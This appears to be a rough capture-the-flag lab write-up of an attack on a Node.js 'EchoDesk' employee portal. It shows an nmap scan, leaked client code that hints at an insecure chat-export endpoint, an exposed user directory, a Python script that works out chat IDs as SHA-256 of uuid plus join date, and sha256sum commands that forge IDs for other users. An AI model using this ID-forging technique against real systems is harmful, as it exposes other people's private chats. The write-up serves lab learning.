@@ -1,0 +1,96 @@
+So right now for this lab our 
+Main IP :: 172.18.60.150
+
+and running nmap scan we will get port 3000 port ppp is open.
+
+Nmap scan report for 172.18.60.150
+Host is up (0.21s latency).
+
+PORT     STATE SERVICE VERSION
+3000/tcp open  http    Node.js Express framework
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: EchoDesk - Employee Portal
+
+So when we read the source code of the Employee Portal and we will see style.css and dashboard.html in which there is an Agentic AI functionality so chating abit
+
+So we can capture much of the status in Burp.
+
+So we got the traffic of chatting and things like it and we got interersting things like app.js and in it we see the Hint.  
+// Vulnerability: Export functionality allows grabbing any chat if you know the ID
+   try {
+        const res = await fetch(`/api/chats/export?chat_id=${currentChatId}`);
+        const data = await res.json();
+/ Directory listing (Publicly exposed)
+async function viewDirectory() {
+    try {
+        const res = await fetch('/api/users');
+        const users = await res.json();
+
+        const list = document.getElementById('directoryList');
+        list.innerHTML = users.map(u => `
+            <div class="dir-item">
+                <strong>${u.name}</strong> (${u.role})<br>
+                <small style="color: #666">Dept: ${u.department}</small><br>
+                <small style="font-family: monospace; color: #888">Employee ID: ${u.uuid}</small><br>
+                <small style="font-family: monospace; color: #888">Joined: ${u.join_date}</small>
+            </div>
+        `).join('');
+
+        document.getElementById('directoryModal').classList.add('active');
+    } catch (e) {
+        alert("Directory unavailable");
+    }
+}
+
+function closeModal(id) {
+    document.getElementById(id).classList.remove('active');
+}
+
+       // Create a download link and trigger it
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `chat_export_${currentChatId.substring(0, 8)}_${new Date().toISOString().split('T')[0]}.json`;
+        document.body.appendChild(a);
+        a.click();
+
+        // Cleanup
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+    } catch (e) {
+        alert("Export failed");
+    }
+}
+
+and much more of hint so first going to /api/users we get lot of user information.
+
+python3 << 'EOF'
+import hashlib, itertools
+
+known = "c3a3f8ca823b51579e6faaeddbc41ff0b9159cfdac10ba3c0133c26112a10835"
+fields = ["43e37c31-18ff-452b-bd9f-1cf18bdc4212", "Guest User", "Sales", "Employee", "2023-11-15"]
+seps = ["", " ", "_", "-", "|", ":", ",", ".", "/", "::"]
+
+for r in range(1, len(fields)+1):
+    for perm in itertools.permutations(fields, r):
+        for sep in seps:
+            candidate = sep.join(perm)
+            if hashlib.sha256(candidate.encode()).hexdigest() == known:
+                print(f"MATCH: {repr(candidate)}")
+                exit()
+print("No simple match")
+EOF
+MATCH: '43e37c31-18ff-452b-bd9f-1cf18bdc4212_2023-11-15'
+
+use this in your case if you want to know what it matches.
+
+So this room is really simple you just need to use mind like me the normal thing to solve this is uuid+joindate and sha256sum
+
+echo -n "1277f1fc-015e-4dfa-b235-786014fabbfd_2022-05-20" | sha256sum
+echo -n "08956962-db6a-445b-a6e3-8a9773773de1_2023-01-10" | sha256sum
+echo -n "9239ff90-7037-4b36-9c5d-73f22c2cfd45_2021-08-15" | sha256sum
+ca906de7dd750f17717fbe522e871b759756efe96a50438b8df2da82d40fb1e4  -
+019c8593cea6f1523e0e71fe0d5db70cf033ceb14aa974a89b46e9ce8599edb0  -
+4db8bf9f0bb5c928989c29a1a5369627094cf8034e8ced645c959210150eaf56  -
+
